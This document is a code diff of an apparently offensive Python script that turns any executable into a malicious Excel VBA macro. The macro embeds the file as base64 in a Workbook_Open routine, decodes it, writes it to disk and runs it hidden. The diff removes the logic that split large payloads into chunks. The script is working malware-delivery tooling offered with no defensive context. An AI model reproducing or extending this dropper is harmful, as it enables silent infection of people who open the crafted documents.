@@ -28,9 +28,9 @@ else: sys.exit(0)
 
 def formStr(varstr, instr):
  holder = []
-# str1 = '\tDim '+ varstr
+ str1 = '\tDim '+ varstr
  str2 = ''
- str1 = '\r\n\t' + varstr + ' = "' + instr[:54] + '"' 
+ str1 = str1 + '\r\n\t' + varstr + ' = "' + instr[:54] + '"' 
  for i in xrange(54, len(instr), 48):
  	holder.append('\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
  	str2 = '"\r\n'.join(holder)
@@ -44,18 +44,10 @@ def formStr(varstr, instr):
 print "[+] Encoding %d bytes" % (len(todo), )
 b64 = todo.encode("base64")
 print "[+] Encoded data is %d bytes" % (len(b64), )
+
 b64 = b64.replace("\n","")
-### added check for procedure too large error (65235b) + the variable space.  We are going to split in chunks of 50000 to ensure we are under the cap
-x=50000
 
-strs = [b64[i:i+x] for i in range(0, len(b64), x)]
-
-for j in range(len(strs)):
-	##### Procedure too large error with large executables #####
-	#str = formStr("var1",b64)
-	strs[j] = formStr("var"+str(j),strs[j])
-
-
+str = formStr("var1",b64)
 
 ########################
 # Deprecated
@@ -82,25 +74,13 @@ next = "Private Function decodeBase64(base64)\r\n\tDim DM, EL\r\n\tSet DM = Crea
 
 then1 = "Private Sub writeBytes(file, bytes)\r\n\tDim binaryStream\r\n\tSet binaryStream = CreateObject(\"ADODB.Stream\")\r\n\tbinaryStream.Type = TypeBinary\r\n\t'Open the stream and write binary data\r\n\tbinaryStream.Open\r\n\tbinaryStream.Write bytes\r\n\t'Save binary data to disk\r\n\tbinaryStream.SaveToFile file, ForWriting\r\nEnd Sub\r\n"
 
-sub_proc=""
-
-for i in range(len(strs)):
-	sub_proc = sub_proc + "Private Function var"+str(i)+" As String\r\n"
-	sub_proc = sub_proc + ""+strs[i]
-	sub_proc = sub_proc + "\r\nEnd Function\r\n"
-
 sub_open = "Private Sub Workbook_Open()\r\n"
-sub_open = sub_open + "\tDim out1 As String\r\n"
-for l in range (len(strs) ):
-	sub_open = sub_open + "\tDim chunk"+str(l)+" As String\r\n"
-	sub_open = sub_open + "\tchunk"+str(l)+" = var"+str(l)+"()\r\n"
-	sub_open = sub_open + "\tout1 = out1 + chunk"+str(l)+"\r\n"
 
-#sub_open = sub_open + str
+sub_open = sub_open + str
 
-sub_open = sub_open + "\r\n\r\n\tDim decode\r\n\tdecode = decodeBase64(out1)\r\n\tDim outFile\r\n\toutFile = \""+args.dest+"\"\r\n\tCall writeBytes(outFile, decode)\r\n\r\n\tDim retVal\r\n\tretVal = Shell(outFile, 0)\r\nEnd Sub"
+sub_open = sub_open + "\r\n\r\n\tDim decode\r\n\tdecode = decodeBase64(var1)\r\n\tDim outFile\r\n\toutFile = \""+args.dest+"\"\r\n\tCall writeBytes(outFile, decode)\r\n\r\n\tDim retVal\r\n\tretVal = Shell(outFile, 0)\r\nEnd Sub"
 
-vb_file = top + next + then1 + sub_proc+ sub_open
+vb_file = top + next + then1 + sub_open
 
 print "[+] Writing to "+args.vb_name
 f = open(args.vb_name, "w")
